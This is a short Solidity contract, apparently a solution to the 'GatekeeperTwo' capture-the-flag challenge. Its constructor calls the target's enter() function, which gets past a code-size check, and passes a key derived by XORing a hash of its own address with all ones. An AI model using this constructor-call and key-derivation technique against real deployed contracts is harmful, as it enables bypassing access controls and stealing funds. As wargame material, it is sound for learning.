// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackGatekeeperTwo {
   constructor(address gatekeeperTwo) public {
       address(gatekeeperTwo).call(abi.encodeWithSignature(
           "enter(bytes8)",
           bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1))
       ));
   }
}